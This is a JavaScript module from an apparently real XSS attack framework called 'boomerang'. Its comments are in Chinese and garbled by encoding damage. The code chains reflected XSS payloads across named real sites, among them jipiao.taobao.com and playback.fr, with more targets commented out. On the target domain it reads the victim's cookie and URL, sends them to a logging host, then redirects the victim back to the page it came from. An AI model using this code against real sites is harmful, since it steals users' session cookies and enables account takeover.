////////////////////////////////////////////////////////
// boomerang ������ģ�飬��ȡ������Զ��վ���cookie
// ����ҳ���ض���ص�ǰҳ��
// Ҫ��Զ��վ�����һ��xss
// �ƺ��ڱ�ģ���е�����վ����Ѽ����� base64.js
///////////////////////////////////////////////////////
//alert("Boomerang.js ������ģ��");

// feedurl ��base.js�ж���
var target_domain = "jipiao.taobao.com";
//var target="http://www.b.com/4.html#'><script src=\'"+feedurl+"\' ></script><'"; 
var target="http://jipiao.taobao.com/hotel/search_hotel.htm?_fmho.h._0.d=%CE%E4%BA%BA&_fmho.h._0.c=2008-11-30&_fmho.h._0.ch=2008-12-01&_fmho.h._0.p=&_fmho.h._0.h=&_fmho.h._0.ho=&_fmho.h._0.hot=&_fmho.h._0.hote=&_fmho.h._0.de=WUH%3F%22%3E<script src=\'"+feedurl+"\' ></script>";
//var target="http://www.underwoodlandcompany.com/?pg=asdf<script src=\'"+feedurl+"\'></script>";
//var target="http://www.waikikicondosearch.com/?pg=asdf<script src=\'"+feedurl+"\'></script>";
//var target="http://www.gobolinux.org/?page=<script src="+feedurl+"></script>";

// ǰҳ��
var org_url = "http://www.playback.fr/recherche.php?search=<script%20src=http://www.secwiki.com/athena/feed.js%20></script>+&button=OK";  
var org_domain = "www.playback.fr";

////////////////////////////////////////////////////////////
// ��ʼִ�й���
///////////////////////////////////////////////////////////

// ����ǵ�ǰҳ�棬����Ŀ���ύ
if ($d.domain == org_domain){
   if ($d.cookie.indexOf("xsstag=1") < 0){
	 // ��cookie������ǣ�ֻ��һ��
	 $d.cookie="xsstag=1; "+$d.cookie;
        //alert(target);
        try {
            formpostTarget(target);
        } catch (e){
            //alert(e);
        }
   }
}

//////////////////////////////////////////////////////////
// �����Ŀ��վ�㣬���ض����ǰҳ�� 
if ($d.domain == target_domain){
	
   //var param = "[**** Request URI: "+window.location.href+" ****]\r\n    [**** Cookie: "+document.cookie+" ****]";  // ���ݻ�server�Ĳ���
   var param = XssGotURI+XssGotCookie;  // ���ݻ�server�Ĳ���
   //alert(param);
   //param = base64encode(param); // base64 ���ܲ�������

   // ����cookie �� uri �� server
   getURL(logurl+param);

   //////////////////////////////////////////////////////
   // ����ԭ����ҳ�档
   formpostTarget(org_url);
}

//////////////////////////////////////////////////////////////
// ������ʱ�����⣬̫�̿��ܵ���lib����ʧ��,����ҳ��򲻿�
// ����ֱ�Ӱ�һЩ�õ��ĺ���д������
